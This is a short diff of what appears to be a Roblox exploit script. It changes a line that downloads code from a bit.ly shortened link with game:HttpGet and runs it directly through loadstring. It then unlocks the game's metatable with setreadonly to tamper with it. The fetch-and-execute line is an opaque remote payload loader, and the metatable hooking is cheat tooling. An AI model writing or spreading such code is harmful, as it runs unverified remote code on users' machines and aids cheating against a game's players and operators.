@@ -1,6 +1,6 @@
 local Version = "v1.1"
 
-loadstring(game:HttpGet("https://bit.ly/robloxownership"))()
+loadstring(game:HttpGet("https://bit.ly/gainownership"))()
 local game_meta = getrawmetatable(game)
 local game_index = game_meta.__index
 setreadonly(game_meta, false)
